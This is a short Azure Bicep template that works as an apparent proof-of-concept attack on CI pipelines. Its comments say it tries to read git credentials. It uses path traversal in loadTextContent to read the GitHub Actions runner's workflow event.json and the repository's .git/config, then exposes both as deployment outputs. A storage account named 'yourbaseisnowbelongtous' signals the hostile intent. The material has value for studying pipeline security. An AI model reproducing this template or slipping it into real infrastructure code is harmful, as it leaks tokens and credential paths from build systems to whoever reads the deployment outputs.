// Try reading git credentials file (the checkout action stores token here)
  var gitCreds = loadTextContent('../../../../../../../../../../home/runner/work/_temp/_github_workflow/event.json')

  // Or try the git config which has credential paths
  var gitConfig = loadTextContent('../.git/config')

  param location string = 'eastus'

  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
    name: 'yourbaseisnowbelongtous'
    location: location
    sku: { name: 'Standard_LRS' }
    kind: 'StorageV2'
  }

  output EVENT_JSON string = gitCreds
  output GIT_CONFIG string = gitConfig